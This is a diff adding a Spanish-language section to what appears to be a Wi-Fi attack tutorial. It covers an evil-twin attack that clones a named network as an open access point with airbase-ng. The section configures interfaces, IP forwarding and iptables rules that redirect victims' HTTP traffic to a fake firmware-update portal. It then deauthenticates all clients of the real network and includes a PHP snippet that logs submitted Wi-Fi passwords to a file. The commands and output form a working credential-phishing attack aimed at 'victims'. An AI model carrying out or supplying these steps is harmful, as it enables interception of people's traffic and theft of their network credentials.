@@ -3411,6 +3411,175 @@ MariaDB [rogue_AP]>
 
 #### Creación de falso punto de acceso via Airbase
 
+Comenzamos a montar nuestro Fake AP. Para ello, a través de la utilidad **airbase**, generaremos un falso
+punto de acceso en el canal especificado.
+
+La idea en este punto, es analizar el entorno y listar los puntos de acceso disponibles. Aquel cuya contraseña
+queramos averiguar, será el que clonaremos, generando un nuevo punto de acceso **OPN** con el mismo ESSID.
+
+Supongamos que la red cuya contraseña quiero averiguar es **MOVISTAR1677**, perfecto pues entonces hacemos lo
+siguiente:
+
+```bash
+┌─[root@parrot]─[/var/www/html]
+└──╼ #airbase-ng -e MOVISTAR_1677 -c 7 -P wlan0mon
+22:13:39  Created tap interface at0
+22:13:39  Trying to set MTU on at0 to 1500
+22:13:39  Access Point with BSSID E4:70:B8:D3:93:5C started.
+```
+
+Con esto, hemos conseguido crear un punto de acceso con nombre **MOVISTAR_1677** en el canal 7, sin
+autenticación.
+
+#### Creación de interfaz y asignación de segmentos
+
+Ya con el punto de acceso creado, comenzamos creando una nueva interfaz **at0**, la cual en cuanto a
+propiedades debe ser equivalente al fichero **dhcpd.conf** previamente creado:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #ifconfig at0 192.168.1.129 netmask 255.255.255.128
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #echo 1 > /proc/sys/net/ipv4/ip_forward
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #ifconfig
+at0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.129  netmask 255.255.255.128  broadcast 192.168.1.255
+        inet6 fe80::e670:b8ff:fed3:935c  prefixlen 64  scopeid 0x20<link>
+        ether e4:70:b8:d3:93:5c  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 57  bytes 8828 (8.6 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.43  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::c114:795c:5d1f:78a7  prefixlen 64  scopeid 0x20<link>
+        ether 80:ce:62:3c:eb:a1  txqueuelen 1000  (Ethernet)
+        RX packets 6777682  bytes 8286953540 (7.7 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3292154  bytes 880484597 (839.6 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 772442  bytes 1353509541 (1.2 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 772442  bytes 1353509541 (1.2 GiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan0mon: flags=867<UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI>  mtu 1800
+        unspec E4-70-B8-D3-93-5C-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
+        RX packets 1179679  bytes 610643779 (582.3 MiB)
+        RX errors 0  dropped 1078475  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #
+```
+
+Os recuerdo que el tercer comando aplicado es necesario para este caso, igual que cuando hacíamos
+envenenamiento ARP, pues para este caso necesitamos contar con el enrutamiento habilitado en nuestro equipo.
+
+#### Control y creación de reglas de enrutamiento por iptables
+
+A continuación, limpiamos cualquier tipo de regla que tengamos previamente definida de **iptables** y generamos nuestras nuevas reglas:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #iptables --flush
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #iptables --table nat --flush
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #iptables --delete-chain
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #iptables --table nat --delete-chain
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #iptables --append FORWARD --in-interface at0 -j ACCEPT
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #iptables -t nat -A POSTROUTING -j MASQUERADE
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #
+```
+
+La idea es nutrir nuestra interfaz **at0** de la conexión padre **eth0**, de esta forma, los usuarios que se
+conecten a nuestro AP podrán navegar por internet sin mayor inconveniente (en otras palabras, crear un túnel
+de conexión).
+
+Asimismo, cualquier tráfico **HTTP** que detectemos por parte de nuestras víctimas, será redireccionado a
+nuestra página web fraudulenta, con el objetivo de hacerles creer que realmente el router necesita de una
+configuración de Firmware y por ello solicita las credenciales de acceso a la red.
+
+#### Sincronización de reglas definidas con el Fake AP
+
+Ya por último, lo que nos queda es sincronizar todas nuestras reglas definidas con el Fake AP, para que cobre
+vida y comience a operar bajo nuestras reglas:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
+Internet Systems Consortium DHCP Server 4.4.1
+Copyright 2004-2018 Internet Systems Consortium.
+All rights reserved.
+For info, please visit https://www.isc.org/software/dhcp/
+Config file: /etc/dhcpd.conf
+Database file: /var/lib/dhcp/dhcpd.leases
+PID file: /var/run/dhcpd.pid
+Wrote 2 leases to leases file.
+Listening on LPF/at0/e4:70:b8:d3:93:5c/192.168.1.128/25
+Sending on   LPF/at0/e4:70:b8:d3:93:5c/192.168.1.128/25
+Sending on   Socket/fallback/fallback-net
+```
+
+Si obtenemos un output como el anterior, es que todo se ha realizado correctamente. Una vez llegados a este
+punto, lo que procedemos desde otra consola es a aplicar un ataque de deautenticación global
+(FF:FF:FF:FF:FF:FF) contra toda la red.
+
+Tras los clientes lanzar paquetes **Probe Request** en busca del AP, como el legítimo queda anulado debido a
+los paquetes que estamos de manera continua enviando, los dispositivos se confundirán y harán que estos se
+conecten a nuestro Fake AP, ¿por qué sin autenticarse?, porque nuestro Fake AP es de protocolo **OPN** :)
+
+Esto del lado de la víctima es casi inperceptible, pues la migración de una red a otra para algunos
+dispositivos es casi inmediata. Ya dependiendo de la imaginación, originalidad e ingenio de cada uno, se podrá
+obtener lo deseado una vez la víctima se mueve por nuestros terrenos.
+
+#### Robo de datos
+
+Como es de esperar, una vez la víctima navegue por una página HTTP, será redireccionada a nuestro portal web
+falso. A nivel de dirección URL, figurará el dominio al cual ha accedido, es decir, no figurará nuestra
+dirección IP.
+
+Una vez esta introduce sus credenciales, estas serán enviadas a nuestra base de datos y a través del servicio
+**MYSQL** de forma interactiva las podremos visualizar sin mayor problema.
+
+Otra forma más cómoda en caso de no haber querido tirar de **MYSQL**, podría haber sido para el **ACTION** del
+HTML principal, haber definido un nuevo archivo **post.php** con una estructura semejante como esta:
+
+```php
+<?php $file = 'wifi-password.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=http://192.168.1.1" />
+```
+
+De manera que tras introducir las credenciales de acceso, estas son depositadas en nuestro equipo en la ruta
+**/var/www/html**, en el fichero **wifi-password.txt**. De igual manera, en caso de introducir múltiples
+contraseñas por parte de varios clientes, estas se van apilando, pudiendo ver todo el histórico de contraseñas
+introducidas.
+
+### Generación de contraseñas con Crunch
+
+
+
+
+
+
 
 
 
